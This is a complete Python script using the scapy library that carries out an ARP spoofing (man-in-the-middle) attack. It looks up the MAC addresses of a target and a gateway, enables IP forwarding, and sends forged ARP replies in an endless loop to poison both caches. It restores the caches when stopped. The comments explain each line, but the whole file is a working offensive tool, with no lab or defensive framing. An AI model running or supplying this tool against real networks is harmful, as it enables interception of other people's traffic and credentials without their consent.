import scapy.all as scapy #importing the scapy module
import subprocess #importing the subprocess module to call system commands
import time #importing the time module
import argparse #importing the argparse module to parse command line arguments

#defining the function to get the mac address of the target
def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip) #create an ARP request
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff') #create a broadcast packet
    arp_request_broadcast = broadcast/arp_request #combine the ARP request and broadcast packet
    answered_list= scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0] #send the packet and store the response in a list
    if answered_list:
        return answered_list[0][1].src #return the mac address of the target from the response
    return None #if no response is received, return None

#defining the function to spoof the ARP cache of the host and the gateway
def spoof (host_ip,host_mac,gateway,gateway_mac):
    packet1 = scapy.ARP(op=2,pdst=host_ip,hwdst=host_mac, psrc=gateway) #create an ARP response packet to spoof the host
    packet2 = scapy.ARP(op=2,pdst=gateway,hwdst=gateway_mac, psrc=host_ip) #create an ARP response packet to spoof the gateway
    scapy.send(packet1,verbose=False) #send the first packet to the host
    scapy.send(packet2,verbose=False) #send the second packet to the gateway

#defining the function to restore the ARP cache of the host and the gateway
def restore(host_ip,host_mac,gateway,gateway_mac):
    packet1 = scapy.ARP(op=2,pdst=host_ip,hwdst=host_mac, psrc=gateway, hwsrc=gateway_mac) #create an ARP response packet to restore the host
    packet2 = scapy.ARP(op=2,pdst=gateway,hwdst=gateway_mac, psrc=host_ip, hwsrc=host_mac) #create an ARP response packet to restore the gateway
    scapy.send(packet1 , verbose=False) #send the first packet to the host
    scapy.send(packet2 , verbose=False) #send the second packet to the gateway

   #define the main function
def main():
    parser = argparse.ArgumentParser() #create a new ArgumentParser object
    parser.add_argument('-g','--gateway', type=str, required=True) #add a new argument 'gateway' which is required and is a string
    parser.add_argument('-t','--target', type=str, required=True) #add a new argument 'target' which is required and is a string
    args = parser.parse_args() #parse the command line arguments
    try:
        p=0 #initialize a counter for the packets sent
        target_mac = get_target_mac(args.target) #get the mac address of the target
        gateway_mac = get_target_mac(args.gateway) #get the mac address of the gateway

        subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward',shell=True) #enable packet forwarding on the system
        while True:
            spoof(args.target,target_mac,args.gateway,gateway_mac) #spoof the ARP cache of the host and the gateway
            p+=2 #increment the counter by 2
            print("\r\033[1;31;40mSending packets ["+ str(p) +"]\033[0m" ,end='') #print the counter
            time.sleep(3) #sleep for 3 seconds
    except KeyboardInterrupt:
        subprocess.call('echo 0 > /proc/sys/net/ipv4/ip_forward',shell=True) #disable packet forwarding on the system
        restore(args.target,target_mac,args.gateway,gateway_mac) #restore the ARP cache of the host and the gateway
        print("\nRestoring order ..") #print a message
        print("[+] Spoofing Stopped") #print a message

if __name__ == "__main__":
    main() #call the main function
